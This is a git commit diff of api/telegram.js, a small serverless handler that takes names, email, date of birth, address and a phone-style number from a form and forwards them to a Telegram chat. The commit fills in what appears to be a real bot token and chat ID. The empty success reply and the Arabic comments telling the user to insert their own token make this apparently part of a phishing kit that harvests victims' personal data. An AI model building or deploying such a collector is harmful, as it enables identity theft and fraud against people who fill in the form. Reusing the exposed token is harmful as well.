66c25f0717aaf6a279ad31e1f498e1cd2e9b0717
onlinemarchi-sudo <onlinemarchi@gmail.com>
2025-10-02 18:44:01 +0400

    Update telegram.js

--- api/telegram.js
+++ api/telegram.js
@@ -1,36 +1,34 @@
-import fetch from "node-fetch";
-
 export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({ message: "Method not allowed" });
+    if (req.method !== "POST") {
+      return res.status(405).json({ message: "Method not allowed" });
+    }
+  
+    const { first_name, last_name, email, dob, address, postal, city, num } = req.body;
+  
+    const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM"; // حط هنا token ديالك
+    const CHAT_ID = "-4982276528"; // حط هنا chat ID ديالك
+  
+    const message = `
+  📨 بيانات جديدة:
+  - nome: ${first_name} ${last_name}
+  - email: ${email}
+  - date : ${dob}
+  - address: ${address}, ${city}, ${postal}
+  - num : ${num}
+    `;
+  
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  
+    try {
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+      });
+  
+      res.status(200).json({ message: "" });
+    } catch (err) {
+      console.error(err);
+      res.status(500).json({ message: "خطأ أثناء الإرسال" });
+    }
   }
-
-  const { first_name, last_name, email, dob, address, postal, city, num } = req.body;
-
-  const BOT_TOKEN = "هنا تحط Token ديال البوت ديالك";
-  const CHAT_ID = "هنا تحط Chat ID ديالك";
-
-  const message = `
-📨 بيانات جديدة:
-- nome: ${first_name} ${last_name}
-- adress: ${email}
-- date : ${dob}
-- adress: ${address}, ${city}, ${postal}
-- number : ${num}
-  `;
-
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-  try {
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
-    });
-
-    res.status(200).json({ message: "" });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ message: "خطأ أثناء الإرسال" });
-  }
-}
